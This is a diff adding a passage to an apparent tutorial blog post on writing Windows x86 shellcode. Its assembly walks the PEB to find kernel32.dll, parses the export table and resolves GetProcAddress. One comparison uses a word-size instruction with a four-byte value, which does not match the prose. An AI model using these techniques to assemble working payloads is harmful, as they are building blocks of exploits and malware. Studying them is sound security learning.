@@ -54,3 +54,57 @@ Roughly, our shellcode will do the following:
 + Use `GetProcAddress` to find the address of and call `ExitProcess` which will quit our program cleanly. 
 
 Sounds simple? Let's get to it!
+
+## Let's Get to Coding
+Anything that is very similar to our last post, I'll leave alone and only highlight significant changes. 
+```asm
+global_start
+
+
+section .text
+_start: 
+
+xor ecx, ecx
+mul ecx
+mov eax, [fs:ecx + 0x30] ; PEB offset
+mov eax, [eax + 0xc]     ; LDR offset
+mov esi, [eax + 0x14]    ; InMemOrderModList
+lodsd                    ; 2nd module
+xchg eax, esi            ; 
+lodsd                    ; 3rd module
+mov ebx, [eax + 0x10]    ; kernel32 base address
+mov edi, [ebx + 0x3c]    ; e_lfanew offset
+add edi, ebx             ; offset + base
+mov edi, [edi + 0x78]    ; export table offset
+add edi, ebx             ; offset + base
+mov esi, [edi + 0x20]    ; namestable offset
+add esi, ebx             ; offset + base
+xor ecx, ecx             
+```
+
+No big changes yet, this is identical to our last shellcode. We now have the address of `kernel32.dll` stored in ESI. 
+
+```asm
+Get_Function:
+ 
+inc ecx                              ; increase ECX to keep track of our iterations
+lodsd                                ; get name offset
+add eax, ebx                         ; get function name
+cmp dword [eax], 0x50746547          ; GetP
+jnz Get_Function
+cmp word [eax + 0xa], 0x73736572     ; ress
+jnz Get_Function
+```
+
+Notic here we again, to save bytes, only compared the first 4 bytes `GetP` and the last 4 bytes `ress` of `GetProcAddress` to the string pointed to by EAX. Now that we have a match, our ECX register has kept track of how many iterations it took so we can move onto translating that into the actual memory address of the function. 
+
+```asm
+mov esi, [edi + 0x24]                ; ESI = Offset ordinals
+add esi, ebx                         ; ESI = Ordinals table
+mov cx, [esi + ecx * 2]              ; Number of function
+dec ecx
+mov esi, [edi + 0x1c]                ; Offset address table
+add esi, ebx                         ; ESI = Address table
+mov edi, [esi + ecx * 4]             ; EDi = Pointer(offset)
+add edi, ebx                         ; EDi = GetProcAddress address
+```
